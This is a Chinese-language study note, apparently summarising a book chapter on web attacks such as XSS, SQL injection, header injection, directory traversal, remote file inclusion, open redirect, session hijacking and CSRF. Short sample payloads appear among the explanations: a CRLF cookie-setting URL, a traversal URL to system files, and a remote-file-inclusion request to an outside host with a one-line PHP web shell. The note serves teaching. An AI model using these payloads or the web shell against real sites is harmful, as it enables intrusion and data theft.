### web攻击模式
#### 1、 主动攻击
主动攻击是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。该攻击针对服务器上的资源，因此前提是要攻击者能够访问服务器上的资源。常见的有sql注入攻击和OS命令注入攻击。
#### 2、 被动攻击
指攻击者设计圈套诱导用户触发攻击动作，从而利用用户的操作已经身份对web服务器发动间接的攻击。

具体步骤：
1、诱导用户触发已经设置好的陷阱，而陷阱启动发送已嵌入攻击代码的HTTP请求。
2、当用户掉入设计的陷阱后，他的浏览器或邮件客户端就会触发这个陷阱。
3、浏览器发送含有攻击代码的HTTP请求到web服务器，运行攻击代码。
4、执行攻击代码后，可能会导致用户重要的Cookie以及其他个人信息重要被窃。最典型的攻击模式就是跨站脚本攻击和跨站点请求伪造。

![image](http://image.zhoufeifan.tech//TuJieHttp/11-1.png)


### 输出转义不完全的攻击方式
- 客户端验证
- 服务端验证
  - 输入值的验证
  - 输出值的转义
  
虽然可以用JavaScript在客户端进行校验，但是客户端的校验不适合作为安全防范的对策，而仅仅是起到提高UI体验的作用。  

Web 应用端输入值验证通常是指检查是否是符合系统业
务逻辑的数值或检查字符编码等预防对策。
从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际,针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传人的攻击代码，而给输出对象带来损害。

#### 利用该漏洞的攻击方式

1、 跨站脚本攻击（XSS）
跨站脚本攻击( Cross-Site Scripting,XSS) 是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的HTML 标签或JavaScript进行的一种攻击。动态创建的HTML 部分有可能隐藏着安全漏洞。
影响点。

- 利用虚假输入表单骗取用户的个人信息。
- 利用非法脚本盗取用户的Cookie值，从而伪造身份，执行恶意的操作。
- 显示虚假信息。


2、Sql注入攻击
在web请求中加入攻击代码，导致web应用程序执行那段恶意的sql语句。该攻击直接威胁到数据库，会导致个人信息的泄露、篡改等安全问题。
影响点
- 非法查看或篡改数据库内的数据
- 规避认证（如用户登录验证）
- 执行和数据库服务器业务相关的程序

利用用户的输入且不执行相关的转义操作，直接把输入的值当做查询条件写入sql语句中，就会出现sql注入攻击的安全漏洞。

3、OS命令注入攻击

	通过HTTP请求在web服务器执行非法的操作系统命令。通常就是让web服务器执行非法的shell脚本操作，来达到攻击的目的。

4、http首部注入攻击
	
	攻击者在http响应首部字段内插入换行符，并且添加任意的响应字段或主体，属于被动攻击。

方式：
url后添加换行符（%0D%0A）伪造字段名：字段值 来达到攻击的效果。

访问http://www.exampel.com/?id=2
```
location:http://www.exampel.com/?id=2
```
访问攻击url http://www.exampel.com/?id=2%0D%0ASet-Cookie:+UID=1234
```
location:http://www.exampel.com/?id=2
Set-Cookie: UID=1234
```
当然也可以影响显示的主体
url http://www.exampel.com/?id=2%0D%0ASet-Cookie:+UID=1234%0D%0%0D%0<html>尼玛</html><!--
```
location:http://www.exampel.com/?id=2
Set-Cookie: UID=1234
%0D%0A
<html>尼玛</html><!--(原来的页面就被注释掉了)
```
影响点
	
- 设置任何Cookie信息
- 重定向到任意url
- 显示任意的主体

5、邮件首部注入攻击

6、目录遍历攻击

对服务器上原本不公开的目录进行非法访问，通常的做法就是利用url中的相对路径去恶意访问机密文件。
合法访问的文件
```
http://example.com/read.php?logo=001.png
```
非法访问
```
http://example.com/read.php?logo=../../etc/password
```
7、远程文件包含攻击
远程文件包含漏洞是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL 充当依赖文
件，让脚本读取之后，就可运行任意脚本的一种攻击。

攻击请求
```
http://example.com/read.php?mod=http://nima.com/cmd.php.cmd=ls
```
然后在自己的服务器上准备了一段攻击代码
```
<? system($_GET['cmd]) ?> 
```
这样攻击者就可以在自己的服务器上对目标服务器执行指定的OS命令了。


### 因web设置或者设计上的一些缺陷引发的安全问题

#### 强制浏览
对一些非公开的文件（涉及到权限的），通过非法的手段进行浏览。
造成的影响

- 泄露用户个人重要的信息
- 泄露原本需要访问权限才可以查阅的信息内容
- 泄露未公开的文件


#### 不正确的消息处理

1、Web应用抛出的错误消息
 举例说明：
 登录界面用户输入账号密码没有通过验证时，不需要做在输入账号有误时提示『帐号不存在』，帐号正确而密码错误时提示『密码不正确』等，而是统一提示『密码不正确』。不然会暴露给攻击者暴露太多的信息，增加账号被盗的风险。

2、数据库等系统抛出的错误消息
执行查询时，sql报错，直接将报错信息显示到界面上，这样就可能暴露数据库以及查询脚本的信息。

3、开放重定向

开放重定向是一种对指定的任意URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的Web网站,那么用户就会被诱导至那个Web网站。

```
//正常的重定向
http://taobao.com?redirect=http://www.tmail.com

//攻击者篡改的重定向
http://taobao.com?redirect=http://www.nima.com
```

### 因session管理疏忽引发的安全漏洞
session是用来管理用户的状态的必备功能，如果出现漏洞，就会导致用户的认证状态被窃取。

#### session劫持

攻击者通过某种方式拿到了用户的session ID,并用其伪装成用户，做一些非法的操作从而达到攻击的目的。session ID 中记录客户端的Cookies等信息，服务端会将Session ID 与认证状态进行一对一匹配管理。

攻击者获得session ID 的方式
- 通过非正规的方法推测session ID
- 通过窃听或XSS攻击盗取Session ID
- 通过会话固定攻击强行获取Session ID

攻击案例图：

![image](http://image.zhoufeifan.tech//TuJieHttp/11-2.png)


#### session 固定攻击
强制用户使用攻击者指定的session ID, 属于被动攻击。
案例图：
![image](http://image.zhoufeifan.tech//TuJieHttp/11-3.png)

#### 跨站点请求伪造
跨站点请求伪造( Cross-Site Request Forgeries,CSRF) 攻击是指攻击者通过设置好的陷阱,强制对已完成认证的用户进行非预期的操作，属于被动攻击。

案例图：

![image](http://image.zhoufeifan.tech//TuJieHttp/11-4.png)

当用通过的认证的用户访问含有攻击者部署恶意代码的留言网页后，会自动触发img标签中的http请求，执行评论操作，添加『你好』评论。